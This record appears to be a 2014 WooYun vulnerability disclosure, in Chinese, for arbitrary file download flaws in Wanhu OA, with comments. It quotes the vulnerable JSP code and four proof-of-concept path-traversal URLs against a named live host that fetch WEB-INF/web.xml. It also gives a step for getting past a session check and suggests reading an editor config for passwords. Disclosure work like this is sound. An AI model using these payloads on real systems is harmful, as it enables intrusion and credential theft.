{"id": 1236, "wybug_id": "wooyun-2014-065752", "wybug_title": "万户OA多处无限制任意文件下载", "wybug_corp": "万户OA", "wybug_author": "瘦蛟舞", "wybug_date": "2014-06-23 17:30", "wybug_open_date": "2014-09-21 17:32", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-21：\t细节向公众公开  简要描述： 万户OA多处无限制任意文件下载 详细说明：  头两处没啥好说的直接利用\n<%  // 得到文件名字和路径  String filepath=\"\";  HttpServletRequest HSR=(HttpServletRequest)pageContext.getRequest();  String path=request.getParameter(\"path\");  filepath=HSR.getRealPath(\"/upload/\")+\"/\"+path+\"/\";  String filename = request.getParameter(\"FileName\");  String name = request.getParameter(\"name\");  // 设置响应头和下载保存的文件名  response.setContentType(\"csv\");  response.setHeader(\"Content-Disposition\",  \"attachment; filename=\\\"\" + name + \"\\\"\");  // 打开指定文件的流信息  java.io.FileInputStream fileInputStream =   new java.io.FileInputStream(filepath + filename);  // 写出流信息  int i;  while ((i=fileInputStream.read()) != -1) {   out.write(i);  }  fileInputStream.close();  out.close(); %>\nPOC1：http://oa.zjcof.com.cn/defaultroot/netdisk/download_netdisk.jsp?path=1&fileName=../../WEB-INF/web&fileExtName=xml&fileSaveName=xPOC2：http://oa.zjcof.com.cn/defaultroot/information_manager/informationmanager_download.jsp?path=..&FileName=WEB-INF/web.xml&name=x\n\n   漏洞证明：  后面两处要多一道程序，不过不麻烦。\n<%  String local = session.getAttribute(\"org.apache.struts.action.LOCALE\").toString();  // 得到文件名字和路径  String filepath=\"\";  HttpServletRequest HSR=(HttpServletRequest)pageContext.getRequest();  String path=request.getParameter(\"path\");  filepath=HSR.getRealPath(\"/upload/\")+\"/wage_manager/\";  String fileRealName = request.getParameter(\"fileRealName\");  String fileSaveName = request.getParameter(\"fileSaveName\");  response.reset();  response.setContentType(\"csv\");  java.io.File file = new java.io.File(filepath+fileSaveName);  String dd = filepath+fileRealName;  if(file.exists()){\tfileRealName = new String(fileRealName.getBytes(\"GBK\"), \"ISO8859-1\");  \tresponse.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\" + fileRealName + \"\\\"\");  \t// 打开指定文件的流信息  \tjava.io.FileInputStream fileInputStream = new java.io.FileInputStream(filepath+fileSaveName);\tjava.io.BufferedInputStream bis = new java.io.BufferedInputStream(fileInputStream);\tbyte[] buffer = new byte[1024];    \tjava.io.OutputStream os =  response.getOutputStream();    \twhile (bis.read(buffer)>0) {        \tos.write(buffer);        }  \tfileInputStream.close();        os.close();  \tout.close();    }else{        response.setContentType(\"text/html; charset=UTF-8\"); %> \t<html>      \t<head>      \t<title></title>      \t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\t  <SCRIPT LANGUAGE=\"JavaScript\">\t\talert(\"<%=com.whir.i18n.Resource.getValue(local,\"common\",\"comm.filenotfound\")%>\");\t    \thistory.back();\t  </SCRIPT>        </head>        <body>        </body>        </html>    <%}%>\n因为要从session中取org.apache.struts.action.LOCALE，如果直接上poc必然会报空指针错误，这时候就需要去登陆页面登陆一下（不需要登陆成功）就可以获得此属性了，之后在上POC就可以啦。POC3：http://oa.zjcof.com.cn/defaultroot/download_netdisk.jsp?path=1&fileName=../../WEB-INF/web&fileExtName=xml&fileSaveName=xPOC4：http://oa.zjcof.com.cn/defaultroot/wage_manager/download_wage_excelMode.jsp?fileRealName=x&fileSaveName=../../WEB-INF/web.xml\n\n在继续利用就可以下载其编辑器配置文件看看密码。\ndefaultroot\\public\\edit\\jsp\\config.jsp\n   修复方案：     版权声明：转载请注明来源 瘦蛟舞@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-06-27 22:52 厂商回复： 按以往处置渠道通报软件生产厂商。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-23 17:35 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @疯狗 咋小厂商了，360那边是按一般厂商处理的了o(︶︿︶)o 唉    \n     2014-06-23 17:39 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @瘦蛟舞 这个没事，很多通用是先通过，然后在慢慢评估厂商级别    \n     2014-06-24 09:53 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @疯狗 袄，知道了，谢谢狗哥。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}